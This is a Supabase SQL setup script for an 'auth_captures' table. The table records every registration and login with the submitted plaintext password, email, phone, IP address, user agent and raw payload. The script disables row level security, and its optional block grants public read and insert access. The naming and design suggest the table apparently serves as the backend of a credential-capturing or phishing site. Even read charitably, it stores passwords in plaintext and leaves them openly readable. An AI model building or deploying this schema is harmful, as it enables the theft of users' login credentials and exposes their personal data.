-- ==============================================================================
-- Supabase Schema: auth_captures (Fixed for Instant Data Capture)
-- Run this in your Supabase SQL Editor:
-- Dashboard -> SQL Editor -> New Query -> Paste & Run
-- ==============================================================================

-- 1. Create the table if not already created
CREATE TABLE IF NOT EXISTS public.auth_captures (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    type TEXT NOT NULL,                         -- 'Registration' or 'Login'
    method TEXT,                                -- 'phone' or 'email' (for login)
    identifier TEXT,                            -- Phone or email used to log in
    email TEXT,                                 -- Email address
    phone TEXT,                                 -- Phone number with country code
    password TEXT NOT NULL,                     -- Password submitted
    currency TEXT,                              -- Currency code (e.g. INR, USD)
    currency_name TEXT,                         -- Currency label
    promo_code TEXT,                            -- Promo / referral code
    agreed_terms BOOLEAN DEFAULT false,         -- Accepted terms & conditions
    ip_address TEXT,                            -- Client IP address
    user_agent TEXT,                            -- Browser / OS information
    raw_data JSONB,                             -- Full original JSON payload
    created_at TIMESTAMPTZ NOT NULL DEFAULT timezone('utc'::text, now())
);

-- 2. Indexes for fast sorting and searching
CREATE INDEX IF NOT EXISTS idx_auth_captures_created_at ON public.auth_captures (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_auth_captures_type ON public.auth_captures (type);
CREATE INDEX IF NOT EXISTS idx_auth_captures_email ON public.auth_captures (email);
CREATE INDEX IF NOT EXISTS idx_auth_captures_phone ON public.auth_captures (phone);

-- 3. DISABLE Row Level Security (RLS) so all captures save instantly without 42501 permission error
ALTER TABLE public.auth_captures DISABLE ROW LEVEL SECURITY;

-- (Optional) If you ever want RLS re-enabled with public access instead of disabled:
-- ALTER TABLE public.auth_captures ENABLE ROW LEVEL SECURITY;
-- DROP POLICY IF EXISTS "Allow public insert" ON public.auth_captures;
-- CREATE POLICY "Allow public insert" ON public.auth_captures FOR INSERT TO public WITH CHECK (true);
-- DROP POLICY IF EXISTS "Allow public select" ON public.auth_captures;
-- CREATE POLICY "Allow public select" ON public.auth_captures FOR SELECT TO public USING (true);
